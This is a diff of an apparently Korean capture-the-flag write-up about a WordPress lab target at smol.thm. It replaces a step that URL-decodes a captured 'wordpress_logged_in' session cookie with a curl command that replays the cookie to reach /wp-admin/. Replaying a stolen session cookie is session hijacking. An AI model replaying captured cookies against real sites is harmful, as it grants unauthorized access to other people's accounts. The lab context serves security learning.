@@ -328,17 +328,16 @@ require_once ABSPATH . 'wp-settings.php';
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/f69cf5b3-c40e-4218-8d4c-afd383ab1e87/image.png)
 
-# 쿠키 원본
+# cookie (total 2)
 
 Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070
 
-# 디코딩
+# request test with cookie
 
-echo "wpuser%7C1753668949%7CcPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv%7Cccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
-
-# 결과
-
-wpuser|1753668949|cPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv|ccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070
+curl -i -L \
+ -H "Cookie: wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_45a7e4c82b517c5af328feabce4d0187=wpuser|1753668949|cPTwzE1cbFpF18C6ZZZnuwRE0D2eRXISGnrDPvbQcBv|ccf2b309c5881393194d94ea8fc1ff5c9b3a8324cfc1282e423f89ccc74ee070" \
+ -H "User-Agent: Mozilla/5.0" \
+ http://www.smol.thm/wp-admin/
 
 # 사이트 탐색 중 시스템 접근을 위한 데이터 수집
 
